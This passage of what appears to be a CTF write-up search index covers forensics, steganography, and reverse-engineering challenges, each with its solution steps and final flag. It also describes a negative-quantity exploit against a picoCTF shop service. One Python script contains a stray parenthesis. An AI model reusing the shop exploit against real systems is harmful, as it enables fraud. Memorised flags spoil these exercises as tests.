https://answers.microsoft.com/zh-hans/windows/forum/all/windows-7-%E4%BE%BF%E7%AC%BA/0712dba1-9349-e011-8dfc-68b599b31bf5 \u641c\u5230\u8def\u5f84\u540e\uff0c\u590d\u5236\u51fa\u6765\uff0c\u62d6\u8fdb010 Editor\u67e5\u770b\uff1a Aw\u524d\u7f00 \u8fd9\u91cc\u5927\u6982\u5c31\u662f\u684c\u9762\u4e0a\u6211\u4eec\u80fd\u770b\u5230\u7684\u90a3\u4e2a\u4fbf\u7b3a\u4e0a\u7684\u5185\u5bb9\uff0c\u518d\u5f80\u4e0b\u4e00\u70b9\u70b9\uff1a word \u770b\u5230word\uff0c\u7136\u540e\u4e0b\u9762\u5c31\u662f xiaoming1314 \uff0c\u731c\u6d4b\u662f flag.docx \u7684\u5bc6\u7801\uff0c\u5c1d\u8bd5\u540e\u53d1\u73b0\u6b63\u786e\uff0c\u5e76\u5229\u7528\u5176\u6253\u5f00 flag.docx \u4fbf\u5f97\u5230flag\u3002","title":"\u6211\u7684\u89e3\u7b54"},{"location":"Writeup/General%20Skills/%E5%B1%82%E5%B1%82%E5%8F%96%E8%AF%81/#flag","text":"flag{9ca871b668f2-b668-097c-cbm8-9op404c891e2}","title":"Flag"},{"location":"Writeup/General%20Skills/%E5%B1%82%E5%B1%82%E5%8F%96%E8%AF%81/#reference","text":"Writeup from https://zhuanlan.zhihu.com/p/402713931","title":"Reference"},{"location":"Writeup/General%20Skills/%E5%B8%A6%E9%9F%B3%E4%B9%90%E5%AE%B6/","text":"\u5e26\u97f3\u4e50\u5bb6 Category: General Skills Source: \u7965\u4e91\u676f2020 Author: unknown Score: 20 Description \u54aa\u6793\u5d03\u772f\uff0c\u97f3\u4e50\u592a\u597d\u542c\u4e86\u3002\u6211\u4e5f\u8981\u521b\u4f5c\u4e00\u66f2\u3002 Solution \u62ff\u5230\u624b\u5148file\u770b\u4e00\u4e0bdecode_it\u7684\u7c7b\u578b \u200b \u53d1\u73b0\u662f\u6807\u51c6\u7684midi\u7684\u6e90\u6587\u4ef6\uff0c\u4f46\u662f\u4e0d\u80fd\u4ee5\u5143\u6570\u636e\u7684\u5f62\u5f0f\u5bfc\u5165\u5230au\uff0c\u5bfc\u5165\u5e93\u4e50\u961f\u65f6\u542c\u5176\u4e2d\u4e00\u4e2a\u97f3\u8f68\u7684\u58f0\u97f3\uff0c\u4e5f\u6ca1\u6709\u4ec0\u4e48\u95ee\u9898\u3002\u5e76\u4e14\u6ce2\u5f62\u56fe\u4e5f\u4e0d\u5177\u5907\u89c4\u5f8b\u3002 \u4e8e\u662f\u60f3\u8d77velato\u8fd9\u4e2a\u5947\u8469\u7684\u7f16\u7a0b\u8bed\u8a00\uff0c\u8fd9\u4e2a\u7f16\u7a0b\u8bed\u8a00\u4e3b\u8981\u662f\u91c7\u7528\u4e86\u6240\u8c13\u7684\u97f3\u7b26\u7f16\u7a0b\uff0c\u53ef\u4ee5\u5230\u5b98\u7f51\u770b\u4e00\u4e0b\u624b\u518c\uff0c\u8fd9\u91cc\u76f4\u63a5\u4e0b\u8f7d\u7f16\u8bd1\u5668\uff0c\u5c1d\u8bd5\u7f16\u8bd1decode_it\uff0c\u770b\u770b\u6709\u5565 \u6210\u529f\u7f16\u8bd1\uff0c\u8fd0\u884cdecode_it.exe\uff0c\u5e94\u8be5\u662fword\u7684\u538b\u7f29\u5305\u5bc6\u7801 \u6210\u529f\u89e3\u538b\u538b\u7f29\u5305\u83b7\u5f97word\uff0c\u663e\u793a\u9690\u85cf\u5b57\u7b26\uff0c\u53ef\u4ee5\u770b\u5230\u91cc\u9762\u7684\u56fe\u7247\u548c\u4e00\u4e32\u5bc6\u6587 \u56fe\u7247\u662f\u7cbe\u7075\u8bed\uff0c\u53c2\u7167\u7ffb\u8bd1\u8868\u5373\u53ef\u7ffb\u8bd1\u51faFLAGIS\uff0c\u90a3\u4e48\u540e\u9762\u90a3\u6bb5\u5bc6\u6587\u5e94\u8be5\u5c31\u662fflag\u7684\u5bc6\u6587\u4e86 \u8fd9\u65f6\u5173\u6ce8\u5230rar\u538b\u7f29\u5305\u7684\u6ce8\u91ca\u90e8\u5206 \u200b \u53d1\u73b0\u7531\u7a7a\u683c\u5b57\u7b26\u548ctab\u5b57\u7b26\u7ec4\u6210\uff0c\u5c06\u7a7a\u683c\u5b57\u7b26\u66ff\u6362\u6210 . \uff0ctab\u5b57\u7b26\u66ff\u6362\u6210- \u6469\u65af\u89e3\u5bc6\u5373\u53ef \u200b \u5df2\u77e5AES\u5bc6\u6587\u548ckey \u5728\u7ebf\u89e3\u5bc6\u5f97\u5230flag Flag flag{mU51c_And_ch@ract0rs~} Reference Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw","title":"\u5e26\u97f3\u4e50\u5bb6"},{"location":"Writeup/General%20Skills/%E5%B8%A6%E9%9F%B3%E4%B9%90%E5%AE%B6/#_1","text":"Category: General Skills Source: \u7965\u4e91\u676f2020 Author: unknown Score: 20","title":"\u5e26\u97f3\u4e50\u5bb6"},{"location":"Writeup/General%20Skills/%E5%B8%A6%E9%9F%B3%E4%B9%90%E5%AE%B6/#description","text":"\u54aa\u6793\u5d03\u772f\uff0c\u97f3\u4e50\u592a\u597d\u542c\u4e86\u3002\u6211\u4e5f\u8981\u521b\u4f5c\u4e00\u66f2\u3002","title":"Description"},{"location":"Writeup/General%20Skills/%E5%B8%A6%E9%9F%B3%E4%B9%90%E5%AE%B6/#solution","text":"\u62ff\u5230\u624b\u5148file\u770b\u4e00\u4e0bdecode_it\u7684\u7c7b\u578b \u200b \u53d1\u73b0\u662f\u6807\u51c6\u7684midi\u7684\u6e90\u6587\u4ef6\uff0c\u4f46\u662f\u4e0d\u80fd\u4ee5\u5143\u6570\u636e\u7684\u5f62\u5f0f\u5bfc\u5165\u5230au\uff0c\u5bfc\u5165\u5e93\u4e50\u961f\u65f6\u542c\u5176\u4e2d\u4e00\u4e2a\u97f3\u8f68\u7684\u58f0\u97f3\uff0c\u4e5f\u6ca1\u6709\u4ec0\u4e48\u95ee\u9898\u3002\u5e76\u4e14\u6ce2\u5f62\u56fe\u4e5f\u4e0d\u5177\u5907\u89c4\u5f8b\u3002 \u4e8e\u662f\u60f3\u8d77velato\u8fd9\u4e2a\u5947\u8469\u7684\u7f16\u7a0b\u8bed\u8a00\uff0c\u8fd9\u4e2a\u7f16\u7a0b\u8bed\u8a00\u4e3b\u8981\u662f\u91c7\u7528\u4e86\u6240\u8c13\u7684\u97f3\u7b26\u7f16\u7a0b\uff0c\u53ef\u4ee5\u5230\u5b98\u7f51\u770b\u4e00\u4e0b\u624b\u518c\uff0c\u8fd9\u91cc\u76f4\u63a5\u4e0b\u8f7d\u7f16\u8bd1\u5668\uff0c\u5c1d\u8bd5\u7f16\u8bd1decode_it\uff0c\u770b\u770b\u6709\u5565 \u6210\u529f\u7f16\u8bd1\uff0c\u8fd0\u884cdecode_it.exe\uff0c\u5e94\u8be5\u662fword\u7684\u538b\u7f29\u5305\u5bc6\u7801 \u6210\u529f\u89e3\u538b\u538b\u7f29\u5305\u83b7\u5f97word\uff0c\u663e\u793a\u9690\u85cf\u5b57\u7b26\uff0c\u53ef\u4ee5\u770b\u5230\u91cc\u9762\u7684\u56fe\u7247\u548c\u4e00\u4e32\u5bc6\u6587 \u56fe\u7247\u662f\u7cbe\u7075\u8bed\uff0c\u53c2\u7167\u7ffb\u8bd1\u8868\u5373\u53ef\u7ffb\u8bd1\u51faFLAGIS\uff0c\u90a3\u4e48\u540e\u9762\u90a3\u6bb5\u5bc6\u6587\u5e94\u8be5\u5c31\u662fflag\u7684\u5bc6\u6587\u4e86 \u8fd9\u65f6\u5173\u6ce8\u5230rar\u538b\u7f29\u5305\u7684\u6ce8\u91ca\u90e8\u5206 \u200b \u53d1\u73b0\u7531\u7a7a\u683c\u5b57\u7b26\u548ctab\u5b57\u7b26\u7ec4\u6210\uff0c\u5c06\u7a7a\u683c\u5b57\u7b26\u66ff\u6362\u6210 . \uff0ctab\u5b57\u7b26\u66ff\u6362\u6210- \u6469\u65af\u89e3\u5bc6\u5373\u53ef \u200b \u5df2\u77e5AES\u5bc6\u6587\u548ckey \u5728\u7ebf\u89e3\u5bc6\u5f97\u5230flag","title":"Solution"},{"location":"Writeup/General%20Skills/%E5%B8%A6%E9%9F%B3%E4%B9%90%E5%AE%B6/#flag","text":"flag{mU51c_And_ch@ract0rs~}","title":"Flag"},{"location":"Writeup/General%20Skills/%E5%B8%A6%E9%9F%B3%E4%B9%90%E5%AE%B6/#reference","text":"Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw","title":"Reference"},{"location":"Writeup/General%20Skills/%E8%80%83%E5%8F%A4/","text":"\u8003\u53e4 Category: General Skills Source: \u7965\u4e91\u676f2021 Author: unknown Score: 15 Description \u5c0f\u660e\u5728\u5bb6\u91cc\u7ffb\u5230\u4e00\u53f0\u5f88\u53e4\u8001\u7684xp\u7b14\u8bb0\u672c\uff0c\u6362\u7535\u6c60\u4e4b\u540e\u53d1\u73b0\u53ef\u4ee5\u6b63\u5e38\u5f00\u673a\uff0c\u4f46\u662f\u53d1\u73b0\u786c\u76d8\u7a7a\u95f4\u4e0d\u8db3\u3002\u6e05\u7406\u8fc7\u7a0b\u4e2d\u5374\u53d1\u751f\u4e86\u4e00\u4e9b\u4e0d\u6109\u5feb\u7684\u4e8b\u60c5... zip Solution Windows system image forensics. The given memory file is a Windows XP SP3 image file. Using volatility to find information in the image, the followings are important: 1. consoles Gives some information about hacked by 1cepeak. 2. pslist Find 2 processes, Oneclickcleanup & DumpIt 3. filescan Find the Oneclickcleanup.exe We should know that DumpIt is the process used to create system image, and this is not related to the solution. Then we should reverse Oneclickcleanup.exe and find the next step. First, we find a key this_a_key . The process uses this key to encrypt data. We get yet another file using reverse. The given file is a doc file with MS Word 6.0 . An old version of document. After the scan and analysis, no macro is found in the doc file, and as well as the hidden character. After struggling several hours, I happened checked the xor brute force of the file, and I found something interesting. This part of the document can be xor using key 0x2d and gives the flag. Flag flag{8bedfdbb-ba42-43d1-858c-c2a5-5012d309} Reference Writeup by Enderaoe Lyther","title":"\u8003\u53e4"},{"location":"Writeup/General%20Skills/%E8%80%83%E5%8F%A4/#_1","text":"Category: General Skills Source: \u7965\u4e91\u676f2021 Author: unknown Score: 15","title":"\u8003\u53e4"},{"location":"Writeup/General%20Skills/%E8%80%83%E5%8F%A4/#description","text":"\u5c0f\u660e\u5728\u5bb6\u91cc\u7ffb\u5230\u4e00\u53f0\u5f88\u53e4\u8001\u7684xp\u7b14\u8bb0\u672c\uff0c\u6362\u7535\u6c60\u4e4b\u540e\u53d1\u73b0\u53ef\u4ee5\u6b63\u5e38\u5f00\u673a\uff0c\u4f46\u662f\u53d1\u73b0\u786c\u76d8\u7a7a\u95f4\u4e0d\u8db3\u3002\u6e05\u7406\u8fc7\u7a0b\u4e2d\u5374\u53d1\u751f\u4e86\u4e00\u4e9b\u4e0d\u6109\u5feb\u7684\u4e8b\u60c5... zip","title":"Description"},{"location":"Writeup/General%20Skills/%E8%80%83%E5%8F%A4/#solution","text":"Windows system image forensics. The given memory file is a Windows XP SP3 image file. Using volatility to find information in the image, the followings are important: 1. consoles Gives some information about hacked by 1cepeak. 2. pslist Find 2 processes, Oneclickcleanup & DumpIt 3. filescan Find the Oneclickcleanup.exe We should know that DumpIt is the process used to create system image, and this is not related to the solution. Then we should reverse Oneclickcleanup.exe and find the next step. First, we find a key this_a_key . The process uses this key to encrypt data. We get yet another file using reverse. The given file is a doc file with MS Word 6.0 . An old version of document. After the scan and analysis, no macro is found in the doc file, and as well as the hidden character. After struggling several hours, I happened checked the xor brute force of the file, and I found something interesting. This part of the document can be xor using key 0x2d and gives the flag.","title":"Solution"},{"location":"Writeup/General%20Skills/%E8%80%83%E5%8F%A4/#flag","text":"flag{8bedfdbb-ba42-43d1-858c-c2a5-5012d309}","title":"Flag"},{"location":"Writeup/General%20Skills/%E8%80%83%E5%8F%A4/#reference","text":"Writeup by Enderaoe Lyther","title":"Reference"},{"location":"Writeup/General%20Skills/%E8%BF%9B%E5%88%B6%E5%8F%8D%E8%BD%AC/","text":"\u8fdb\u5236\u53cd\u8f6c Category: General Skills Source: \u7965\u4e91\u676f2020 Author: unknown Score: 40 Description \u7535\u8111\u4e2d\u5230\u5e95\u4f7f\u7528\u7684\u662f\u4ec0\u4e48\u8fdb\u5236\u5462\uff1f\u771f\u662f\u9ebb\u70e6\uff0c\u6709\u65f6\u5019\u8fd8\u662f\u624b\u673a\u597d\u7528\u3002 \u7ed3\u679c\u7528flag{}\u5305\u4f4f\uff0c\u5e76\u4e14\u5168\u4e3a\u5927\u5199 Solution \u4e0b\u53d1\u7684\u6587\u4ef6\u663e\u793a\u635f\u574f\u65e0\u6cd5\u6253\u5f00\uff0c\u4f46\u662f\u624b\u673a\u53ef\u4ee5\u6b63\u5e38\u6253\u5f00\uff0c010edit\u6253\u5f00\u663e\u793aCRC\u9519\u8bef\uff0c\u4fee\u6539\u540e\u63d0\u793a\u9700\u8981\u5bc6\u7801\u89e3\u5bc6\uff0c\u4f46\u662f\u7206\u7834rar\u672a\u679c\uff0c\u4e8e\u662f\u60f3\u8d77\u6765\u53ef\u80fd\u662frar\u538b\u7f29\u4f2a\u52a0\u5bc6\uff0c\u5c1d\u8bd5\u4fee\u6539 \u56fe\u793a\u6807\u8bb0\u4f4d\u7f6e\u7684D4\u4fee\u6539\u4e3aD0\u5373\u53ef\u89e3\u538b \u200b \u4fee\u6539\u540e\u5373\u53ef\u89e3\u538b\u5f97\u5230flag.wav \u91cc\u9762\u662fflag.wav\uff0c\u4ee5\u5143\u6570\u636e\u7684\u6a21\u5f0f\u5bfc\u5165au\u5229\u7528AU\u8fdb\u884c\u97f3\u9891\u53cd\u8f6c\uff0c\u5f97\u5230\u4e00\u6bb5\u52c9\u5f3a\u80fd\u542c\u7684\u97f3\u9891\uff0c \u200b 0.5\u500d\u901f\u64ad\u653e\u540e\u4f7f\u7528qq\u97f3\u4e50\u542c\u6b4c\u8bc6\u66f2\uff0c\u5f97\u77e5\u662fToo Good At Goodbyes Flag flag{TOOGOODATGOODBYES} Reference Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw","title":"\u8fdb\u5236\u53cd\u8f6c"},{"location":"Writeup/General%20Skills/%E8%BF%9B%E5%88%B6%E5%8F%8D%E8%BD%AC/#_1","text":"Category: General Skills Source: \u7965\u4e91\u676f2020 Author: unknown Score: 40","title":"\u8fdb\u5236\u53cd\u8f6c"},{"location":"Writeup/General%20Skills/%E8%BF%9B%E5%88%B6%E5%8F%8D%E8%BD%AC/#description","text":"\u7535\u8111\u4e2d\u5230\u5e95\u4f7f\u7528\u7684\u662f\u4ec0\u4e48\u8fdb\u5236\u5462\uff1f\u771f\u662f\u9ebb\u70e6\uff0c\u6709\u65f6\u5019\u8fd8\u662f\u624b\u673a\u597d\u7528\u3002 \u7ed3\u679c\u7528flag{}\u5305\u4f4f\uff0c\u5e76\u4e14\u5168\u4e3a\u5927\u5199","title":"Description"},{"location":"Writeup/General%20Skills/%E8%BF%9B%E5%88%B6%E5%8F%8D%E8%BD%AC/#solution","text":"\u4e0b\u53d1\u7684\u6587\u4ef6\u663e\u793a\u635f\u574f\u65e0\u6cd5\u6253\u5f00\uff0c\u4f46\u662f\u624b\u673a\u53ef\u4ee5\u6b63\u5e38\u6253\u5f00\uff0c010edit\u6253\u5f00\u663e\u793aCRC\u9519\u8bef\uff0c\u4fee\u6539\u540e\u63d0\u793a\u9700\u8981\u5bc6\u7801\u89e3\u5bc6\uff0c\u4f46\u662f\u7206\u7834rar\u672a\u679c\uff0c\u4e8e\u662f\u60f3\u8d77\u6765\u53ef\u80fd\u662frar\u538b\u7f29\u4f2a\u52a0\u5bc6\uff0c\u5c1d\u8bd5\u4fee\u6539 \u56fe\u793a\u6807\u8bb0\u4f4d\u7f6e\u7684D4\u4fee\u6539\u4e3aD0\u5373\u53ef\u89e3\u538b \u200b \u4fee\u6539\u540e\u5373\u53ef\u89e3\u538b\u5f97\u5230flag.wav \u91cc\u9762\u662fflag.wav\uff0c\u4ee5\u5143\u6570\u636e\u7684\u6a21\u5f0f\u5bfc\u5165au\u5229\u7528AU\u8fdb\u884c\u97f3\u9891\u53cd\u8f6c\uff0c\u5f97\u5230\u4e00\u6bb5\u52c9\u5f3a\u80fd\u542c\u7684\u97f3\u9891\uff0c \u200b 0.5\u500d\u901f\u64ad\u653e\u540e\u4f7f\u7528qq\u97f3\u4e50\u542c\u6b4c\u8bc6\u66f2\uff0c\u5f97\u77e5\u662fToo Good At Goodbyes","title":"Solution"},{"location":"Writeup/General%20Skills/%E8%BF%9B%E5%88%B6%E5%8F%8D%E8%BD%AC/#flag","text":"flag{TOOGOODATGOODBYES}","title":"Flag"},{"location":"Writeup/General%20Skills/%E8%BF%9B%E5%88%B6%E5%8F%8D%E8%BD%AC/#reference","text":"Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw","title":"Reference"},{"location":"Writeup/General%20Skills/%E9%B8%A3%E9%9B%8F%E6%81%8B/","text":"\u9e23\u96cf\u604b Category: General Skills Source: \u7965\u4e91\u676f2021 Author: unknown Score: 5 Description \u5728\u559c\u6b22\u7684\u4eba\u9762\u524d,\u6211\u53ef\u4e0d\u80fd\u2026\u2026\u4e22\u8138\u554a\u2026\u2026\u56e0\u4e3a\u6211,\u559c\u6b22\u9e23\u4eba\u541b\u2026\u2026\u2026\u2026 zip \u9898\u76ee\u63cf\u8ff0 \u9898\u76ee\u7ed9\u4e86\u6211\u4eec\u4e00\u4e2adocx\uff0c\u4f46\u662f\u53cc\u51fb\u6253\u4e0d\u5f00\u3002 \u6211\u7684\u89e3\u7b54 \u9996\u5148\u540e\u7f00\u6539zip\u89e3\u538b\u4e4b\uff0c\u53d1\u73b0 _rels \u6587\u4ef6\u5939\u4e0b\u6709\u4e1c\u897f\uff1a key.txt \u548c\u4e00\u4e2aZIP\u538b\u7f29\u5305\u3002 \u5c06 key.txt \u62d6\u5165010 editor\u53d1\u73b0\u540e\u9762 E2 80 8D \u548c E2 80 8C \u51fa\u73b0\u7684\u6700\u591a\uff0c\u731c\u6d4b\u662f\u96f6\u5bbd\u9690\u5199\uff1a https://330k.github.io/misc_tools/unicode_steganography.html \u5c06key.txt\u4e2d\u5185\u5bb9\u5168\u9009\u5e76\u590d\u5236\uff0c\u7c98\u8d34\u8fdb\u53bb\u89e3\u7801\u5c31\u6709\u5bc6\u7801\uff1a Because I like naruto best \u5229\u7528\u8fd9\u4e2a\u5bc6\u7801\u5c06ZIP\u538b\u7f29\u5305\u89e3\u538b\u4e4b\u540e\u662f\u5f88\u591a\u9e23\u4eba\u548c\u96cf\u7530\u7684\u5934\u50cf\uff0c\u800c\u4e14\u4ece\u524d\u9762\u7684\u6587\u4ef6\u4e0a\u6765\u770b\uff0c\u5e94\u8be5\u662f\u6309\u7167\u6570\u5b57\u987a\u5e8f\uff0c\u6bcf8\u4e2a\u4e00byte\uff0c\u96cf\u75300\uff0c\u9e23\u4eba1\u3002\u5982\u679c\u8fd9\u6837\u505a\u7684\u8bdd\uff0c\u89e3\u51fa\u524d\u4e09\u4e2a\u5b57\u6bcd\u662f dat \u3002\u5199\u811a\u672c\u89e3\u51fa\uff0c\u53d1\u73b0\u524d\u9762\u4e3a data:image/png;base64, \u5c06\u540e\u9762\u7684\u5185\u5bb9base64\u89e3\u7801\u4e4b\u540e\u5199\u5230PNG\u6587\u4ef6\uff0c\u5c31\u80fd\u770b\u5230flag\u3002 \u8981\u773c\u529b\u770b \u811a\u672c\u5982\u4e0b\uff1a from tqdm import tqdm from Crypto.Util.number import * import base64 with open('_rels/love/out/0.png', 'rb') as f: zero = f.read() ans = '' for i in tqdm(range(129488)): with open(f'_rels/love/out/{i}.png', 'rb') as f: s = f.read() if (s == zero): ans += '0' else: ans += '1' s = long_to_bytes(int(ans, 2))).decode() s = base64.b64decode(s[22:]) with open('gao_3.png', 'wb') as f: f.write(s) Flag flag{57dd74fb21bb1aee50f19421bf836f23} Reference Writeup from https://zhuanlan.zhihu.com/p/402713931","title":"\u9e23\u96cf\u604b"},{"location":"Writeup/General%20Skills/%E9%B8%A3%E9%9B%8F%E6%81%8B/#_1","text":"Category: General Skills Source: \u7965\u4e91\u676f2021 Author: unknown Score: 5","title":"\u9e23\u96cf\u604b"},{"location":"Writeup/General%20Skills/%E9%B8%A3%E9%9B%8F%E6%81%8B/#description","text":"\u5728\u559c\u6b22\u7684\u4eba\u9762\u524d,\u6211\u53ef\u4e0d\u80fd\u2026\u2026\u4e22\u8138\u554a\u2026\u2026\u56e0\u4e3a\u6211,\u559c\u6b22\u9e23\u4eba\u541b\u2026\u2026\u2026\u2026 zip","title":"Description"},{"location":"Writeup/General%20Skills/%E9%B8%A3%E9%9B%8F%E6%81%8B/#_2","text":"\u9898\u76ee\u7ed9\u4e86\u6211\u4eec\u4e00\u4e2adocx\uff0c\u4f46\u662f\u53cc\u51fb\u6253\u4e0d\u5f00\u3002","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"Writeup/General%20Skills/%E9%B8%A3%E9%9B%8F%E6%81%8B/#_3","text":"\u9996\u5148\u540e\u7f00\u6539zip\u89e3\u538b\u4e4b\uff0c\u53d1\u73b0 _rels \u6587\u4ef6\u5939\u4e0b\u6709\u4e1c\u897f\uff1a key.txt \u548c\u4e00\u4e2aZIP\u538b\u7f29\u5305\u3002 \u5c06 key.txt \u62d6\u5165010 editor\u53d1\u73b0\u540e\u9762 E2 80 8D \u548c E2 80 8C \u51fa\u73b0\u7684\u6700\u591a\uff0c\u731c\u6d4b\u662f\u96f6\u5bbd\u9690\u5199\uff1a https://330k.github.io/misc_tools/unicode_steganography.html \u5c06key.txt\u4e2d\u5185\u5bb9\u5168\u9009\u5e76\u590d\u5236\uff0c\u7c98\u8d34\u8fdb\u53bb\u89e3\u7801\u5c31\u6709\u5bc6\u7801\uff1a Because I like naruto best \u5229\u7528\u8fd9\u4e2a\u5bc6\u7801\u5c06ZIP\u538b\u7f29\u5305\u89e3\u538b\u4e4b\u540e\u662f\u5f88\u591a\u9e23\u4eba\u548c\u96cf\u7530\u7684\u5934\u50cf\uff0c\u800c\u4e14\u4ece\u524d\u9762\u7684\u6587\u4ef6\u4e0a\u6765\u770b\uff0c\u5e94\u8be5\u662f\u6309\u7167\u6570\u5b57\u987a\u5e8f\uff0c\u6bcf8\u4e2a\u4e00byte\uff0c\u96cf\u75300\uff0c\u9e23\u4eba1\u3002\u5982\u679c\u8fd9\u6837\u505a\u7684\u8bdd\uff0c\u89e3\u51fa\u524d\u4e09\u4e2a\u5b57\u6bcd\u662f dat \u3002\u5199\u811a\u672c\u89e3\u51fa\uff0c\u53d1\u73b0\u524d\u9762\u4e3a data:image/png;base64, \u5c06\u540e\u9762\u7684\u5185\u5bb9base64\u89e3\u7801\u4e4b\u540e\u5199\u5230PNG\u6587\u4ef6\uff0c\u5c31\u80fd\u770b\u5230flag\u3002 \u8981\u773c\u529b\u770b \u811a\u672c\u5982\u4e0b\uff1a from tqdm import tqdm from Crypto.Util.number import * import base64 with open('_rels/love/out/0.png', 'rb') as f: zero = f.read() ans = '' for i in tqdm(range(129488)): with open(f'_rels/love/out/{i}.png', 'rb') as f: s = f.read() if (s == zero): ans += '0' else: ans += '1' s = long_to_bytes(int(ans, 2))).decode() s = base64.b64decode(s[22:]) with open('gao_3.png', 'wb') as f: f.write(s)","title":"\u6211\u7684\u89e3\u7b54"},{"location":"Writeup/General%20Skills/%E9%B8%A3%E9%9B%8F%E6%81%8B/#flag","text":"flag{57dd74fb21bb1aee50f19421bf836f23}","title":"Flag"},{"location":"Writeup/General%20Skills/%E9%B8%A3%E9%9B%8F%E6%81%8B/#reference","text":"Writeup from https://zhuanlan.zhihu.com/p/402713931","title":"Reference"},{"location":"Writeup/Reverse%20Engineering/Shop/","text":"Shop Category: Reverse Engineering Source: picoCTF 2021 Author: THELSHELL Score: 5 Description Best Stuff - Cheap Stuff, Buy Buy Buy... Store Instance: source . The shop is open for business at nc mercury.picoctf.net 37799 . Hints Always check edge cases when programming Approach I connected to nc mercury.picoctf.net 34938 and played around for a bit. There's only 40 coins in circulation which means the 100 coin flag is not something that can be bought. You have 40 coins Item Price Count (0) Quiet Quiches 10 12 (1) Average Apple 15 8 (2) Fruitful Flag 100 1 (3) Sell an Item (4) Exit Choose an option: After playing around for a bit, I sold a negative number of item.... and ended up with a negative value for money. Through this I realized I should also be able to buy negative numbers of items since the shop probably only checks if there are less than how many items are in their stock. I bought a negative number of items and sure enough, ended up with a large enough sum of coins to buy a flag. Flag is: [112 105 99 111 67 84 70 123 98 52 100 95 98 114 111 103 114 97 109 109 101 114 95 98 97 54 98 56 99 100 102 125] This looks like ascii so I wrote a quick Python script to get the flag Flag picoCTF{b4d_brogrammer_ba6b8cdf} Reference Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Reverse%20Engineering/Shop/Shop.md","title":"Shop"},{"location":"Writeup/Reverse%20Engineering/Shop/#shop","text":"Category: Reverse Engineering Source: picoCTF 2021 Author: THELSHELL Score: 5","title":"Shop"},{"location":"Writeup/Reverse%20Engineering/Shop/#description","text":"Best Stuff - Cheap Stuff, Buy Buy Buy... Store Instance: source . The shop is open for business at nc mercury.picoctf.net 37799 .","title":"Description"},{"location":"Writeup/Reverse%20Engineering/Shop/#hints","text":"Always check edge cases when programming","title":"Hints"},{"location":"Writeup/Reverse%20Engineering/Shop/#approach","text":"I connected to nc mercury.picoctf.net 34938 and played around for a bit. There's only 40 coins in circulation which means the 100 coin flag is not something that can be bought. You have 40 coins Item Price Count (0) Quiet Quiches 10 12 (1) Average Apple 15 8 (2) Fruitful Flag 100 1 (3) Sell an Item (4) Exit Choose an option: After playing around for a bit, I sold a negative number of item.... and ended up with a negative value for money. Through this I realized I should also be able to buy negative numbers of items since the shop probably only checks if there are less than how many items are in their stock. I bought a negative number of items and sure enough, ended up with a large enough sum of coins to buy a flag. Flag is: [112 105 99 111 67 84 70 123 98 52 100 95 98 114 111 103 114 97 109 109 101 114 95 98 97 54 98 56 99 100 102 125] This looks like ascii so I wrote a quick Python script to get the flag","title":"Approach"},{"location":"Writeup/Reverse%20Engineering/Shop/#flag","text":"picoCTF{b4d_brogrammer_ba6b8cdf}","title":"Flag"},{"location":"Writeup/Reverse%20Engineering/Shop/#reference","text":"Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Reverse%20Engineering/Shop/Shop.md","title":"Reference"},{"location":"Writeup/Reverse%20Engineering/apk1/","text":"apk1 Category: Reverse Engineering Source: \u7965\u4e91\u676f2020 Author: unknown Score: 30 Description this is a easy apk Solution JEB\u6253\u5f00apk\uff0c\u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u4e3b\u903b\u8f91\u7684\u5728native\u5c42\uff0c\u4f46\u662f\u8981\u6ce8\u610f\u7684\u662f\u8c03\u7528\u7684\u662fcheck\u51fd\u6570\u800c\u4e0d\u662fcheck1\u51fd\u6570 IDA\u6253\u5f00so\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u76f4\u63a5\u6709check1\u51fd\u6570 \u800ccheck\u51fd\u6570\u662f\u901a\u8fc7JNI_Onload\u4e2dregisterNatives\u51fd\u6570\u6ce8\u518c\u7684\uff0c\u53ef\u4ee5\u901a\u8fc7\u53cd\u6c47\u7f16\u627e\u5230\u5173\u952e\u4f4d\u7f6e check\u51fd\u6570\u4e3b\u903b\u8f91\u5982\u4e0b\uff1a \u7a0d\u4f5c\u5206\u6790\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u5bf9\u6211\u4eec\u7684\u8f93\u5165\u957f\u5ea6\u8fdb\u884c\u4e86\u5224\u65ad\u662f\u5426\u662f22\u4f4d\uff0c\u7136\u540e\u5bf9\u5176\u8fdb\u884c\u4e86hex\u8f6c\u5316\uff0c\u63a5\u7740rc4\u52a0\u5bc6\uff0c\u5bc6\u94a5\u662fflag\uff0c\u6700\u540e\u7528DES\u52a0\u5bc6\uff0c\u5bc6\u94a5\u8fd8\u662fflag\uff0c\u6700\u540e\u548c\u660e\u65870x99EDA1D941316EEA\u8fdb\u884c\u5bf9\u6bd4\u3002\u8981\u6ce8\u610f\u662f\u7684rc4\u751f\u6210\u65f6\u7528\u5230\u4e86crc\u6821\u9a8c\uff0c\u90a3\u4e48\u53ef\u4ee5\u7528\u52a8\u6001\u8c03\u8bd5\u53bb\u89e3\u5bc6rc4\u3002 #-*- coding:utf-8 from numpy import* from Crypto.Cipher import DES from Crypto.Cipher import ARC4 key='666C6167' des = DES.new(key, DES.MODE_ECB) cipher1='99EDA1D941316EEA'.decode('hex') plain1=des.decrypt(cipher1) print(plain1.encode('hex')) #\u6c42\u51fades\u89e3\u5bc6\u660e\u6587 \u52a8\u6001\u8c03\u8bd5\u89e3\u51farc4\u5bc6\u6587\uff0c\u5373\u4e3aflag Flag flag{76952041E276E2BF} Reference Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw","title":"apk1"},{"location":"Writeup/Reverse%20Engineering/apk1/#apk1","text":"Category: Reverse Engineering Source: \u7965\u4e91\u676f2020 Author: unknown Score: 30","title":"apk1"},{"location":"Writeup/Reverse%20Engineering/apk1/#description","text":"this is a easy 